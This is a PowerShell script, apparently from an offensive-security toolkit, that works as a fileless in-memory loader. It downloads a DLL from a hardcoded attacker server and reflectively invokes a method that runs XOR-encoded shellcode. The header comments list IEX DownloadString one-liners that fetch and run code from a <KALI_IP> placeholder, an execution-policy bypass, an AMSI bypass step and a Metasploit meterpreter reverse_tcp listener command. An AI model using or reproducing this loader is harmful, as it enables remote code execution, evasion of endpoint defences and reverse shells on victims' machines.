# ================================================================
# DLL_Loader.ps1 — Fileless In-Memory DLL Loader (Reflective Assembly Load)
# ================================================================
# WHAT THIS DOES:
#   Downloads DLL_Runner.dll from your web server directly into memory
#   (never written to disk), then uses .NET reflection to find and call
#   the runner() method inside ClassLibrary1.Class1.
#   The runner() method decodes XOR-encoded shellcode and executes it.
#
#   This is the fileless delivery mechanism for DLL_Runner.cs.
#   The entire attack chain stays in PowerShell memory — no .exe on disk.
#
# PREREQUISITES:
#   1. Compile DLL_Runner.cs as a DLL (see DLL_Runner.cs header for instructions)
#   2. Host the DLL on your Kali web server:
#        cp ClassLibrary1.dll /var/www/html/runner.dll
#        python3 -m http.server 80
#   3. Start your meterpreter listener (see below)
#
# ----------------------------------------------------------------
# BEFORE RUNNING — CHANGE THE URL
# ----------------------------------------------------------------
#   Edit the URL in the $data line below to point to your web server:
#     $data = (new-object net.webclient).downloadData('http://<KALI_IP>/runner.dll')
#
# ----------------------------------------------------------------
# HOW TO RUN
# ----------------------------------------------------------------
#
#   OPTION 1 — Run the file directly (bypass execution policy):
#     powershell -ExecutionPolicy Bypass -File .\DLL_Loader.ps1
#
#   OPTION 2 — Download and run from memory (fully fileless, no ps1 on disk):
#     IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')
#
#   OPTION 3 — Run from inside an existing meterpreter session:
#     meterpreter> load powershell
#     meterpreter> powershell_execute "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')"
#
#   OPTION 4 — Paste directly into a PowerShell window (bypasses file-based policy):
#     Just copy-paste the content of this file into a PS prompt
#
# ----------------------------------------------------------------
# IF AMSI BLOCKS IT
# ----------------------------------------------------------------
#   Run the AMSI bypass first in the same PS session, then run this loader:
#     IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/amsi-bypass.ps1')
#     IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')
#
#   Or use the AMSI bypass from 01-evasion/amsi-bypass/ps-amsi-bypass.ps1
#
# ----------------------------------------------------------------
# START YOUR LISTENER FIRST (on Kali)
# ----------------------------------------------------------------
#   msfconsole -q -x "use exploit/multi/handler; \
#     set payload windows/x64/meterpreter/reverse_tcp; \
#     set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
#
# BEFORE RUNNING, CHANGE:
#   - The URL in $data line -> your Kali IP and your DLL filename
# ================================================================
$data = (new-object net.webclient).downloadData('http://172.21.23.10/runner.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0,$null)